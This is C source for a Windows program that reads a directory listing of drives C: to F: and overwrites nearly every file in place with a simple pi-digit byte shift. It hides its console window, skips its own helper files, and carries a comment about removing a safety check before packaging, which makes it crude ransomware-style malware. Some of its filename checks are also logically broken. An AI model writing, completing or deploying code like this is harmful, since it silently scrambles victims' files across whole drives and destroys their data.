#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include "Windows.h"  
#define MAX_LINE 1024
//long long pai10[100] = {1415926535,8979323846,2643383279,5028841971,6939937510,5820974944,5923078164,0628620899,8628034825,3421170679,8214808651,3282306647,0938446095,5058223172,5359408128,4811174502,8410270193,8521105559,6446229489,5493038196,4428810975,6659334461,2847564823,3786783165,2712019091,4564856692,3460348610,4543266482,1339360726,0249141273,7245870066,0631558817,4881520920,9628292540,9171536436,7892590360,0113305305,4882046652,1384146951,9415116094,3305727036,5759591953,0921861173,8193261179,3105118548,0744623799,6274956735,1885752724,8912279381,8301194912,9833673362,4406566430,8602139494,6395224737,1907021798,6094370277,0539217176,2931767523,8467481846,7669405132,0005681271,4526356082,7785771342,7577896091,7363717872,1468440901,2249534301,4654958537,1050792279,6892589235,4201995611,2129021960,8640344181,5981362977,4771309960,5187072113,4999999837,2978049951,0597317328,1609631859,5024459455,3469083026,4252230825,3344685035,2619311881,7101000313,7838752886,5875332083,8142061717,7669147303,5982534904,2875546873,1159562863,8823537875,9375195778,1857780532,1712268066,1300192787,6611195909,2164201989};
int pai[1000];
char *pai10 = "1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989";



void fenli(void){
	int i=0;
 
    for(i=0; *(pai10+i) != '\0'; i++)
        *(pai + i) = *(pai10 + i)-'0';
 
}//分离
void encode(char aim[]){
	char ch;
	int *buffer;
	
	int start;
	int length = 0;
	int place =0;
	fenli();
    FILE *in;
	//FILE *out; //测试用
	in=fopen(aim,"r+");
	fseek(in,0,SEEK_END);
	buffer = (int*)malloc(sizeof(int) * (ftell(in)+10));
	fclose(in);
	in=fopen(aim,"r+");
	//out=fopen("out.txt","r+"); //测试用
	buffer[0]=fgetc(in);//第一个字符留存根	
	srand(buffer[0]);
	//fclose (in);
	//in=fopen("test.txt","r+");
	start=rand()%128;
	int remain_start=start;//存根，用于解码
    ch=buffer[0]; 
    while(ch!=EOF) //判断刚读取的字符是否是文件结束符
    {	
		//if(ch+pai[start]<=127){
			ch=ch+pai[start];
		//} else{
		//	ch=ch-127+pai[start];
		//};
		
		start++;
		if(start>=1000){
			start=0;
			}
        //fputc(ch,out); //测试用
		buffer[length]=ch;
		length++;
		//printf("%d,",ch);//测试用
        ch=fgetc(in);
		
    };
	//int remain_length = length;//存根，用于解码
    fclose(in); //关闭
	in=fopen(aim,"w+");
	fputc(remain_start,in);

   for(;place<length;place++){
	   fputc(buffer[place],in);
	   
	};
	fclose(in);
	free(buffer);
	buffer=NULL;
}
void readfilename(void){//i代表搜索第几行
	char buf[MAX_LINE];  /*缓冲区*/
	FILE *list;            /*文件指针*/
	int len;             /*行字符个数*/
	//int howlong;
	if((list = fopen("filenamelist.txt","r+")) == NULL)
	{
	perror("fail to read");
	exit (1) ;
	}
	
	while(fgets(buf,MAX_LINE,list) != NULL)
	{	
		char aim[MAX_PATH];
		char path[MAX_PATH];
		char finalpath[MAX_PATH];
		len = strlen(buf);
		buf[len-1] = '\0';	
		if(buf[0]==32&&buf[2]==':'&&(buf[1]=='C'||buf[1]=='D'||buf[1]=='E'||buf[1]=='F')&&buf[4]!=36){
			int ori;
			for(ori=1;buf[ori]!=32||buf[ori+1]!=-75||buf[ori+2]!=-60;ori++){
				path[ori-1]=buf[ori];
				}
				path[ori-1]='\0';
				char help[]="0";
				help[0]=92;
				strcat(path,help);
				//printf("%s\n",path);
				
			}
		if((buf[len-2]!='l'||buf[len-3]!='l'||buf[len-2]!='d'||buf[len-2]!='.')
			//&&(buf[len-2]!='p'||buf[len-3]!='m'||buf[len-4]!='b'||buf[len-5]!='.')
			//&&(buf[len-2]!='f'||buf[len-3]!='d'||buf[len-4]!='p'||buf[len-5]!='.')
			//&&(buf[len-2]!='4'||buf[len-3]!='p'||buf[len-4]!='m'||buf[len-5]!='.')
			//&&(buf[len-2]!='r'||buf[len-3]!='a'||buf[len-4]!='r'||buf[len-5]!='.')
			//&&(buf[len-2]!='f'||buf[len-3]!='i'||buf[len-4]!='g'||buf[len-5]!='.')
			//&&(buf[len-2]!='f'||buf[len-3]!='i'||buf[len-4]!='g'||buf[len-5]!='.')
			//&&(buf[len-2]!='s'||buf[len-3]!='l'||buf[len-4]!='x'||buf[len-5]!='.')
			//&&(buf[len-2]!='x'||buf[len-3]!='s'||buf[len-4]!='l'||buf[len-5]!='x'||buf[len-6]!='.')
			&&(buf[len-2]!='t'||buf[len-3]!='p'||buf[len-4]!='p'||buf[len-5]!='.')){
		if(buf[0]=='2'&&buf[1]=='0'&&buf[4]=='/'&&buf[21]!='<'&&buf[36]!=36){
			
			
			if((buf[36] != 'f'||buf[37]!='i'||buf[38]!='l'||buf[39]!='e'||buf[40]!='n'||buf[41]!='a'||buf[42]!='m'||buf[43]!='e'||buf[44]!='l')//打包制作前去掉这行if判断重新编译
				&&(buf[36]!='c'||buf[37]!='o'||buf[38]!='p'||buf[39]!='y')
				&&(buf[36]!='e'||buf[37]!='n'||buf[38]!='c'||buf[39]!='o'||buf[40]!='d'||buf[41]!='e')
				&&(buf[36]!='s'||buf[37]!='e'||buf[38]!='a'||buf[39]!='r'||buf[40]!='c'||buf[41]!='h')
				&&(buf[36]!='s'||buf[37]!='h'||buf[38]!='e'||buf[39]!='l'||buf[40]!='l'||buf[41]!='e'||buf[42]!='x'||buf[43]!='e'||buf[44]!='c'||buf[45]!='u'||buf[46]!='t'||buf[47]!='e')
				&&(buf[36]!='s'||buf[37]!='t'||buf[38]!='a'||buf[39]!='r'||buf[40]!='t'||buf[41]!='e'||buf[42]!='n'||buf[43]!='c'||buf[44]!='o'||buf[45]!='d'||buf[46]!='e')
				&&(buf[36]!='s'||buf[37]!='t'||buf[38]!='a'||buf[39]!='r'||buf[40]!='t'||buf[41]!='e'||buf[42]!='x'||buf[43]!='e'||buf[44]!='c'||buf[45]!='u'||buf[46]!='t'||buf[47]!='e')){
				
				//howlong = strlen(path);
				//path[howlong] = '\\';
				strcpy(aim,&buf[36]);
				strcpy(finalpath,path);
				strcat(finalpath,aim);
				encode(finalpath);
				//printf("%s\n",finalpath);
			
			
			}
			
		}
	}
		//Sleep(50);
		
	}
	
}

int main(int argc,char *argv[])
{	
	ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);
	readfilename();
	//system("pause");
	return 0;
}

